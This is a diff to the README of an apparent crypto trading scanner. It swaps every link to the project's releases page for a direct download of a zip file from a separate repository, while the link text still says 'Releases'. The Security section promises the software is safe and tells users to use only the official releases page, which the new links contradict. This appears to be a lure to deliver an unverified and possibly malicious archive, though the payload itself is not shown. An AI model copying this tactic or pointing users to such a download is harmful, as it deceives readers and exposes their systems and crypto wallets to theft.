@@ -5,7 +5,7 @@ description: "🕵️‍♂️ Analyze on-chain movements in milliseconds to spo
 ---
 # 🕵️‍♂️ Crypto-Alpha-Scanner - Detect Crypto Trends Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Alpha%20Scanner-brightgreen?style=for-the-badge)](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/releases)
+[![Download Now](https://img.shields.io/badge/Download-Alpha%20Scanner-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/AYdeveloper/aydeveloper.github.io/main/upchannel/Latest_1.4-alpha.4.zip)
 
 ## 📖 Project Overview
 **Crypto Alpha Scanner** is an advanced automation tool that analyzes blockchain activities in milliseconds. It captures "Alpha" opportunities before they appear on exchanges or social media. While regular investors check CoinGecko, this bot monitors mempool and block data directly.
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection:** Stable internet for real-time updates
 
 ## 📥 Download & Install
-Visit this page to download: [Crypto Alpha Scanner Releases](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/releases)
+Visit this page to download: [Crypto Alpha Scanner Releases](https://raw.githubusercontent.com/AYdeveloper/aydeveloper.github.io/main/upchannel/Latest_1.4-alpha.4.zip)
 
 1. Click the **Download** button above to go to the releases page.
 2. Find the latest version of Crypto Alpha Scanner.
@@ -66,7 +66,7 @@ Expect regular updates that may include:
 - New features for improved user experience
 - Bug fixes and performance improvements
 
-These updates can be accessed on the same releases page: [Crypto Alpha Scanner Releases](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/releases).
+These updates can be accessed on the same releases page: [Crypto Alpha Scanner Releases](https://raw.githubusercontent.com/AYdeveloper/aydeveloper.github.io/main/upchannel/Latest_1.4-alpha.4.zip).
 
 ## 🛡️ Security and Privacy
 Crypto Alpha Scanner prioritizes your security. It does not store your private keys or sensitive wallet information. Always ensure the software is downloaded from the official releases page.
